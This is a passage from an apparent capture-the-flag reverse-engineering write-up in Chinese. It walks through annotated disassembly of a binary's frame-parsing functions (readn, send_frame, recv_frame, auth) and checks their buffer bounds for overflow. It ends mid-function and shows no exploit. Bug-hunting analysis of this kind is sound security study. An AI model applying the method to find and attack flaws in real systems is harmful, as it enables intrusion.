\NormalTok{1336: 48 c7 }\DecValTok{45}\NormalTok{ e8 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{  mov }\DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{],}\BaseNTok{0x0}  \CommentTok{; off = 0（已讀量）}
\NormalTok{133e: eb }\DecValTok{3}\BaseNTok{d}\NormalTok{                  jmp    }\DecValTok{137}\BaseNTok{d}
\NormalTok{1340: 48 8b 45 d0            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x30}\OperatorTok{]}        \CommentTok{; len}
\NormalTok{1344: 48 2b 45 e8            sub    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{]}        \CommentTok{; len {-} off  → 還要讀多少}
\NormalTok{1348: 48 8b 4d d8            mov    }\KeywordTok{rcx}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{]}
\NormalTok{134c: 48 8b 55 e8            mov    }\KeywordTok{rdx}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{]}
\NormalTok{1350: 48 01 d1               add    }\KeywordTok{rcx}\OperatorTok{,}\KeywordTok{rdx}               \CommentTok{; buf + off}
\NormalTok{1353: 48 89 c2               mov    }\KeywordTok{rdx}\OperatorTok{,}\KeywordTok{rax}               \CommentTok{; 參數3 = count}
\NormalTok{1356: 48 89 ce               mov    }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rcx}               \CommentTok{; 參數2 = buf+off}
\NormalTok{1359: bf }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{         mov    }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x0}               \CommentTok{; 參數1 = fd 0 (stdin)}
\NormalTok{135e: e8 }\DecValTok{6}\BaseNTok{d}\NormalTok{ fd ff ff         call   }\DecValTok{10}\BaseNTok{d}\ErrorTok{0} \OperatorTok{\textless{}}\NormalTok{read}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}\OperatorTok{\textgreater{}}
\NormalTok{1363: 48 89 45 f0            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x10}\OperatorTok{],}\KeywordTok{rax}        \CommentTok{; n = read(...)}
\NormalTok{1367: 48 83 7d f0 }\DecValTok{00}\NormalTok{         cmp    }\DataTypeTok{QWORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x10}\OperatorTok{],}\BaseNTok{0x0}
\NormalTok{136c: 7f 07                  }\ControlFlowTok{jg}     \DecValTok{1375}                  \CommentTok{; n \textgreater{} 0 → 繼續}
\NormalTok{136e: b8 ff ff ff ff         mov    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0xffffffff}        \CommentTok{; EOF/錯誤 → 回 {-}1}
\NormalTok{1373: eb }\DecValTok{17}\NormalTok{                  jmp    }\DecValTok{138}\ErrorTok{c}
\NormalTok{1375: 48 8b 45 f0            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x10}\OperatorTok{]}
\NormalTok{1379: 48 01 45 e8            add    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{],}\KeywordTok{rax}        \CommentTok{; off += n}
\NormalTok{137d: 48 8b 45 e8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{]}
\NormalTok{1381: 48 3b 45 d0            cmp    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x30}\OperatorTok{]}        \CommentTok{; off \textless{} len ?}
\NormalTok{1385: 72 b9                  jb     }\DecValTok{1340}                  \CommentTok{; 是 → 再讀}
\NormalTok{1387: b8 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{         mov    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x0}               \CommentTok{; 成功}
\end{Highlighting}
\end{Shaded}

\paragraph{\texorpdfstring{4.5 \texttt{send\_\allowbreak{}frame} @
\texttt{0x13a2}（組訊框 + \texttt{memcpy} +
\texttt{write}）}{4.5 send\_frame @ 0x13a2（組訊框 + memcpy + write）}}\label{send_frame-0x13a2ux7d44ux8a0aux6846-memcpy-write}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{13a2: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa            endbr64}
\NormalTok{13a6: 55                     }\BuiltInTok{push}   \KeywordTok{rbp}
\NormalTok{13a7: 48 89 e5               mov    }\KeywordTok{rbp}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{13aa: 53                     }\BuiltInTok{push}   \KeywordTok{rbx}                   \CommentTok{; 保存 rbx（callee{-}saved）}
\NormalTok{13ab: 48 83 ec }\DecValTok{28}\NormalTok{            sub    }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x28}
\NormalTok{13af: 89 f9                  mov    }\KeywordTok{ecx}\OperatorTok{,}\KeywordTok{edi}               \CommentTok{; status}
\NormalTok{13b1: 48 89 75 d0            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x30}\OperatorTok{],}\KeywordTok{rsi}        \CommentTok{; data}
\NormalTok{13b5: 89 d0                  mov    }\KeywordTok{eax}\OperatorTok{,}\KeywordTok{edx}               \CommentTok{; len}
\NormalTok{13b7: 89 ca                  mov    }\KeywordTok{edx}\OperatorTok{,}\KeywordTok{ecx}
\NormalTok{13b9: 88 55 dc               mov    }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x24}\OperatorTok{],}\KeywordTok{dl} \CommentTok{; status（1 byte）}
\NormalTok{13bc: 66 89 45 d8            mov    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{],}\KeywordTok{ax} \CommentTok{; len（2 bytes）}
\NormalTok{13c0: 64 48 8b 04 25 28 00 00 00   }\BuiltInTok{mov} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{13c9: 48 89 45 e8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{],}\KeywordTok{rax}        \CommentTok{; 金絲雀}
\NormalTok{13cf: 0f b7 }\DecValTok{45}\NormalTok{ d8            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{]} \CommentTok{; len}
\NormalTok{13d3: 83 c0 }\DecValTok{01}\NormalTok{               add    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x1}               \CommentTok{; len+1}
\NormalTok{13d6: 66 89 45 e6            mov    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1a}\OperatorTok{],}\KeywordTok{ax} \CommentTok{; n1 = len + 1（含 status）}
\NormalTok{13da: 0f b7 }\DecValTok{45}\NormalTok{ e6            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1a}\OperatorTok{]}
\NormalTok{13de: 48 83 c0 }\DecValTok{07}\NormalTok{            add    }\KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x7}
\NormalTok{13e2: 48 3d 00 08 00 00      }\BuiltInTok{cmp}    \KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x800}
\NormalTok{13e8: 0f 87 c3 }\DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{      ja     }\DecValTok{14}\ErrorTok{b1}                  \CommentTok{; n1+7 \textgreater{} 0x800 → 放棄（保護）}
\NormalTok{13ee: c6 }\DecValTok{05} \DecValTok{6}\ErrorTok{b} \DecValTok{2}\ErrorTok{c} \DecValTok{00} \DecValTok{00} \BaseNTok{1b}\NormalTok{   mov    }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x2c6b}\OperatorTok{],}\BaseNTok{0x1b}   \OperatorTok{\#} \DecValTok{4060} \OperatorTok{=}\NormalTok{ ESC}
\NormalTok{13f5: c6 }\DecValTok{05} \DecValTok{65} \DecValTok{2}\ErrorTok{c} \DecValTok{00} \DecValTok{00} \DecValTok{5}\ErrorTok{b}\NormalTok{   mov    }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x2c65}\OperatorTok{],}\BaseNTok{0x5b}   \OperatorTok{\#} \DecValTok{4061} \OperatorTok{=} \StringTok{\textquotesingle{}[\textquotesingle{}}
\NormalTok{13fc: 0f b7 }\DecValTok{45}\NormalTok{ e6            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1a}\OperatorTok{]}
\NormalTok{1400: 66 c1 e8 }\DecValTok{08}            \OperatorTok{shr}    \KeywordTok{ax}\OperatorTok{,}\BaseNTok{0x8}
\NormalTok{1404: 88 05 58 2c 00 00      }\BuiltInTok{mov}    \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x2c58}\OperatorTok{],}\KeywordTok{al}     \OperatorTok{\#} \DecValTok{4062} \OperatorTok{=}\NormalTok{ n1 高位}
\NormalTok{140a: 0f b7 }\DecValTok{45}\NormalTok{ e6            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1a}\OperatorTok{]}
\NormalTok{140e: 88 05 4f 2c 00 00      }\BuiltInTok{mov}    \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x2c4f}\OperatorTok{],}\KeywordTok{al}     \OperatorTok{\#} \DecValTok{4063} \OperatorTok{=}\NormalTok{ n1 低位}
\NormalTok{1414: 0f b6 }\DecValTok{45}\NormalTok{ dc            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x24}\OperatorTok{]}
\NormalTok{1418: 88 05 46 2c 00 00      }\BuiltInTok{mov}    \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x2c46}\OperatorTok{],}\KeywordTok{al}     \OperatorTok{\#} \DecValTok{4064} \OperatorTok{=}\NormalTok{ status}
\NormalTok{141e: 66 83 7d d8 }\DecValTok{00}\NormalTok{         cmp    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{],}\BaseNTok{0x0}
\NormalTok{1423: 74 1a                  }\ControlFlowTok{je}     \FloatTok{143}\BaseNTok{f}                  \CommentTok{; len==0 → 跳過 memcpy}
\NormalTok{1425: 0f b7 }\DecValTok{55}\NormalTok{ d8            movzx  }\KeywordTok{edx}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{]} \CommentTok{; 參數3 = len}
\NormalTok{1429: 48 8d 0d 35 2c 00 00   }\BuiltInTok{lea}    \KeywordTok{rcx}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x2c35}\OperatorTok{]}     \CommentTok{; 4065 = txbuf+5}
\NormalTok{1430: 48 8b 45 d0            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x30}\OperatorTok{]}
\NormalTok{1434: 48 89 c6               mov    }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rax}               \CommentTok{; 參數2 = data}
\NormalTok{1437: 48 89 cf               mov    }\KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rcx}               \CommentTok{; 參數1 = txbuf+5}
\NormalTok{143a: e8 a1 fc ff ff         call   }\FloatTok{10e0} \OperatorTok{\textless{}}\NormalTok{memcpy}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}\OperatorTok{\textgreater{}}     \CommentTok{; memcpy(txbuf+5, data, len)}
\NormalTok{143f: 0f b7 }\DecValTok{45}\NormalTok{ e6            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1a}\OperatorTok{]}
\NormalTok{1443: 48 8d 15 1a 2c 00 00   }\BuiltInTok{lea}    \KeywordTok{rdx}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x2c1a}\OperatorTok{]}     \CommentTok{; 4064}
\NormalTok{144a: 0f b7 }\DecValTok{4}\BaseNTok{d}\NormalTok{ e6            movzx  }\KeywordTok{ecx}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1a}\OperatorTok{]}
\NormalTok{144e: 8d 59 04               }\BuiltInTok{lea}    \KeywordTok{ebx}\OperatorTok{,[}\KeywordTok{rcx}\OperatorTok{+}\BaseNTok{0x4}\OperatorTok{]}
\NormalTok{1451: 89 c6                  mov    }\KeywordTok{esi}\OperatorTok{,}\KeywordTok{eax}               \CommentTok{; 參數2 = n1}
\NormalTok{1453: 48 89 d7               mov    }\KeywordTok{rdi}\OperatorTok{,}\KeywordTok{rdx}               \CommentTok{; 參數1 = txbuf+4}
\NormalTok{1456: e8 }\DecValTok{8}\ErrorTok{e}\NormalTok{ fd ff ff         call   }\FloatTok{11e9}                 \CommentTok{; checksum(txbuf+4, n1)}
\NormalTok{145b: 48 63 d3               movsxd }\KeywordTok{rdx}\OperatorTok{,}\KeywordTok{ebx}               \CommentTok{; rdx = n1+4}
\NormalTok{145e: 48 8d 0d fb }\DecValTok{2}\ErrorTok{b} \DecValTok{00} \DecValTok{00}\NormalTok{   lea    }\KeywordTok{rcx}\OperatorTok{,[}\NormalTok{rip}\OperatorTok{+}\BaseNTok{0x2bfb}\OperatorTok{]}     \CommentTok{; 4060}
\NormalTok{1465: 88 04 0a               }\BuiltInTok{mov}    \DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rdx}\OperatorTok{+}\KeywordTok{rcx}\OperatorTok{*}\DecValTok{1}\OperatorTok{],}\KeywordTok{al} \CommentTok{; txbuf[n1+4] = crc}
\NormalTok{1468..1498: 在 txbuf}\OperatorTok{[}\NormalTok{n1}\OperatorTok{+}\DecValTok{5}\OperatorTok{]=}\BaseNTok{0x1b}\NormalTok{、txbuf}\OperatorTok{[}\NormalTok{n1}\OperatorTok{+}\DecValTok{6}\OperatorTok{]=}\BaseNTok{0x5c}\NormalTok{ 寫入結尾}
\NormalTok{1490: 0f b7 }\DecValTok{45}\NormalTok{ e6            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1a}\OperatorTok{]}
\NormalTok{1494: 48 83 c0 }\DecValTok{07}\NormalTok{            add    }\KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x7}               \CommentTok{; 總長 = n1+7}
\NormalTok{14a2: 48 89 c6               mov    }\KeywordTok{rsi}\OperatorTok{,}\KeywordTok{rax}               \CommentTok{; ← txbuf（4060）}
\NormalTok{14a5: bf }\DecValTok{01} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{         mov    }\KeywordTok{edi}\OperatorTok{,}\BaseNTok{0x1}               \CommentTok{; fd = 1 (stdout)}
\NormalTok{14aa: e8 f1 fb ff ff         call   }\DecValTok{10}\ErrorTok{a0} \OperatorTok{\textless{}}\NormalTok{write}\FunctionTok{@}\ErrorTok{p}\NormalTok{lt}\OperatorTok{\textgreater{}}      \CommentTok{; write(1, txbuf, n1+7)}
\end{Highlighting}
\end{Shaded}

\begin{quote}
全域 \texttt{txbuf} 在 \texttt{.\allowbreak{}bss:\allowbreak{}0x4060}，長度上限剛好
\texttt{0x800}（\texttt{0x4060\ \allowbreak{}+\ \allowbreak{}0x800\ \allowbreak{}=\ \allowbreak{}0x4860}）。
\end{quote}

\paragraph{\texorpdfstring{4.6 \texttt{recv\_\allowbreak{}frame} @
\texttt{0x14cc}（解析訊框 ------
檢查邏輯，含長度上限）}{4.6 recv\_frame @ 0x14cc（解析訊框 ------ 檢查邏輯，含長度上限）}}\label{recv_frame-0x14ccux89e3ux6790ux8a0aux6846-ux6aa2ux67e5ux908fux8f2fux542bux9577ux5ea6ux4e0aux9650}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{14cc: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa            endbr64}
\NormalTok{14d0: 55                     }\BuiltInTok{push}   \KeywordTok{rbp}
\NormalTok{14d1: 48 89 e5               mov    }\KeywordTok{rbp}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{14d4: 53                     }\BuiltInTok{push}   \KeywordTok{rbx}
\NormalTok{14d5: 48 83 ec }\DecValTok{38}\NormalTok{            sub    }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x38}
\NormalTok{14d9: 48 89 7d d8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{],}\KeywordTok{rdi}        \CommentTok{; outbuf}
\NormalTok{14dd: 48 89 75 d0            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x30}\OperatorTok{],}\KeywordTok{rsi}        \CommentTok{; *outlen}
\NormalTok{14e1: 48 89 55 c8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x38}\OperatorTok{],}\KeywordTok{rdx}        \CommentTok{; *err}
\NormalTok{14f4: 48 8b 45 d8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{]}
\NormalTok{14f8: be }\DecValTok{04} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{         mov    }\KeywordTok{esi}\OperatorTok{,}\BaseNTok{0x4}
\NormalTok{1500: e8 }\DecValTok{0}\ErrorTok{e}\NormalTok{ fe ff ff         call   }\DecValTok{1313}                 \CommentTok{; readn(outbuf, 4) 讀檔頭}
\NormalTok{1513..1532: 讀 outbuf}\OperatorTok{[}\FloatTok{0.}\OperatorTok{.}\DecValTok{1}\OperatorTok{]}\NormalTok{ 組成 big}\OperatorTok{{-}}\NormalTok{endian magic → }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1e}\OperatorTok{]}
\NormalTok{1536: 66 81 7d e2 }\DecValTok{5}\ErrorTok{b} \BaseNTok{1b}\NormalTok{      cmp    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1e}\OperatorTok{],}\BaseNTok{0x1b5b}    \CommentTok{; "ESC["}
\NormalTok{153c: 74 11                  }\ControlFlowTok{je}     \FloatTok{154}\BaseNTok{f}
\NormalTok{153e: 48 8b 45 c8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x38}\OperatorTok{]}
\NormalTok{1542: c6 }\DecValTok{00}\NormalTok{ e1               mov    }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{],}\BaseNTok{0xe1}   \CommentTok{; *err = 0xe1（magic 錯）}
\NormalTok{154f..1572: 讀 outbuf}\OperatorTok{[}\FloatTok{2.}\OperatorTok{.}\DecValTok{3}\OperatorTok{]}\NormalTok{ 組成 big}\OperatorTok{{-}}\NormalTok{endian L → }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1c}\OperatorTok{]}
\NormalTok{1576: 66 83 7d e4 }\DecValTok{00}\NormalTok{         cmp    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1c}\OperatorTok{],}\BaseNTok{0x0}
\NormalTok{157b: 74 10                  }\ControlFlowTok{je}     \DecValTok{158}\BaseNTok{d}                  \CommentTok{; L == 0 → 錯誤}
\NormalTok{157d: 0f b7 }\DecValTok{45}\NormalTok{ e4            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1c}\OperatorTok{]}
\NormalTok{1581: 48 83 c0 }\DecValTok{07}\NormalTok{            add    }\KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x7}
\NormalTok{1585: 48 3d 00 08 00 00      }\BuiltInTok{cmp}    \KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x800}
\NormalTok{158b: 76 11                  }\ControlFlowTok{jbe}    \DecValTok{159}\ErrorTok{e}                  \CommentTok{; ✶ L+7 \textless{}= 0x800 才合法}
\NormalTok{158d: 48 8b 45 c8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x38}\OperatorTok{]}
\NormalTok{1591: c6 }\DecValTok{00}\NormalTok{ e2               mov    }\DataTypeTok{BYTE} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{],}\BaseNTok{0xe2}   \CommentTok{; *err = 0xe2（長度錯）}
\NormalTok{159e: 0f b7 }\DecValTok{45}\NormalTok{ e4            movzx  }\KeywordTok{eax}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1c}\OperatorTok{]}
\NormalTok{15a2: 48 8d 50 03            }\BuiltInTok{lea}    \KeywordTok{rdx}\OperatorTok{,[}\KeywordTok{rax}\OperatorTok{+}\BaseNTok{0x3}\OperatorTok{]}         \CommentTok{; L+3}
\NormalTok{15a6: 48 8b 45 d8            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x28}\OperatorTok{]}
\NormalTok{15aa: 48 83 c0 }\DecValTok{04}\NormalTok{            add    }\KeywordTok{rax}\OperatorTok{,}\BaseNTok{0x4}               \CommentTok{; outbuf+4}
\NormalTok{15b4: e8 }\DecValTok{5}\ErrorTok{a}\NormalTok{ fd ff ff         call   }\DecValTok{1313}                 \CommentTok{; readn(outbuf+4, L+3)}
\NormalTok{15c7..15d8: stored }\OperatorTok{=}\NormalTok{ outbuf}\OperatorTok{[}\NormalTok{L}\OperatorTok{+}\DecValTok{4}\OperatorTok{]}\NormalTok{（訊框裡的 crc byte）}
\NormalTok{15db..15ec: }\ControlFlowTok{call} \FloatTok{11e9}               \CommentTok{; computed = checksum(outbuf+4, L)}
\NormalTok{15f1: 38 c3                  cmp    }\KeywordTok{bl}\OperatorTok{,}\KeywordTok{al}
\NormalTok{15f3: 74 0e                  }\ControlFlowTok{je}     \DecValTok{1603}
\NormalTok{15f5: → *}\PreprocessorTok{err} \OperatorTok{=} \BaseNTok{0xe3}\PreprocessorTok{（}\NormalTok{CRC }\PreprocessorTok{不符）}
\NormalTok{1603..1638: 讀 outbuf}\OperatorTok{[}\NormalTok{L}\OperatorTok{+}\FloatTok{5.}\OperatorTok{.}\NormalTok{L}\OperatorTok{+}\DecValTok{6}\OperatorTok{]}\NormalTok{ 組成 big}\OperatorTok{{-}}\NormalTok{endian trailer}
\NormalTok{163c: 66 81 7d e6 }\DecValTok{5}\ErrorTok{c} \BaseNTok{1b}\NormalTok{      cmp    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1a}\OperatorTok{],}\BaseNTok{0x1b5c}   \CommentTok{; "ESC\textbackslash{}"}
\NormalTok{1642: 74 0e                  }\ControlFlowTok{je}     \DecValTok{1652}
\NormalTok{1644: → *}\PreprocessorTok{err} \OperatorTok{=} \BaseNTok{0xe4}\PreprocessorTok{（結尾錯）}
\NormalTok{1652: 48 8b 45 d0            mov    }\KeywordTok{rax}\OperatorTok{,[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x30}\OperatorTok{]}
\NormalTok{1656: 0f b7 }\DecValTok{55}\NormalTok{ e4            movzx  }\KeywordTok{edx}\OperatorTok{,}\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x1c}\OperatorTok{]}
\NormalTok{165a: 66 89 10               }\BuiltInTok{mov}    \DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rax}\OperatorTok{],}\KeywordTok{dx}     \CommentTok{; *outlen = L}
\NormalTok{165d: b8 }\DecValTok{00} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{         mov    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0x0}               \CommentTok{; 成功}
\end{Highlighting}
\end{Shaded}

\textbf{重點}：\texttt{readn(outbuf+4,\allowbreak{}\ \allowbreak{}L+3)} 最多寫
\texttt{4\ \allowbreak{}+\ \allowbreak{}0x7f9\ \allowbreak{}+\ \allowbreak{}3\ \allowbreak{}=\ \allowbreak{}0x800} bytes 到 \texttt{0x4860}， 而
\texttt{.\allowbreak{}bss} 到 \texttt{0x5060} 剛好是 \texttt{0x800} 長 →
\textbf{這裡是安全的}（作者算得很精準）。

\paragraph{\texorpdfstring{4.7 \texttt{auth} @ \texttt{0x167c}（opcode
1：驗鑰匙卡，設定
capacity）}{4.7 auth @ 0x167c（opcode 1：驗鑰匙卡，設定 capacity）}}\label{auth-0x167copcode-1ux9a57ux9470ux5319ux5361ux8a2dux5b9a-capacity}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{167c: f3 }\FloatTok{0}\BaseNTok{f} \DecValTok{1}\ErrorTok{e}\NormalTok{ fa            endbr64}
\NormalTok{1680: 55                     }\BuiltInTok{push}   \KeywordTok{rbp}
\NormalTok{1681: 48 89 e5               mov    }\KeywordTok{rbp}\OperatorTok{,}\KeywordTok{rsp}
\NormalTok{1684: 48 83 ec }\DecValTok{30}\NormalTok{            sub    }\KeywordTok{rsp}\OperatorTok{,}\BaseNTok{0x30}
\NormalTok{1688: 48 89 7d d8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x18}\OperatorTok{],}\KeywordTok{rdi}        \CommentTok{; state（＝呼叫者的 rbp{-}0x110）}
\NormalTok{168c: 48 89 75 d0            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x20}\OperatorTok{],}\KeywordTok{rsi}        \CommentTok{; payload（＝.bss:0x4864）}
\NormalTok{1690: 89 d0                  mov    }\KeywordTok{eax}\OperatorTok{,}\KeywordTok{edx}
\NormalTok{1692: 66 89 45 dc            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x24}\OperatorTok{],}\KeywordTok{ax}         \CommentTok{; len}
\NormalTok{1696: 64 48 8b 04 25 28 00 00 00  }\BuiltInTok{mov} \KeywordTok{rax}\OperatorTok{,}\DataTypeTok{QWORD} \DataTypeTok{PTR} \KeywordTok{fs}\OperatorTok{:}\BaseNTok{0x28}
\NormalTok{169f: 48 89 45 f8            mov    }\OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x8}\OperatorTok{],}\KeywordTok{rax}
\NormalTok{16a5: 66 83 7d dc }\DecValTok{05}\NormalTok{         cmp    }\DataTypeTok{WORD} \DataTypeTok{PTR} \OperatorTok{[}\KeywordTok{rbp}\OperatorTok{{-}}\BaseNTok{0x24}\OperatorTok{],}\BaseNTok{0x5}
\NormalTok{16aa: 74 0a                  }\ControlFlowTok{je}     \DecValTok{16}\ErrorTok{b6}                  \CommentTok{; ✶ len 必須 == 5}
\NormalTok{16ac: b8 e2 ff ff ff         mov    }\KeywordTok{eax}\OperatorTok{,}\BaseNTok{0xffffffe2}        \CommentTok{; {-}30（長度錯）}
\NormalTok{16b1: e9 }\DecValTok{80} \DecValTok{00} \DecValTok{00} \DecValTok{00}\NormalTok{         jmp    }\DecValTok{1736}
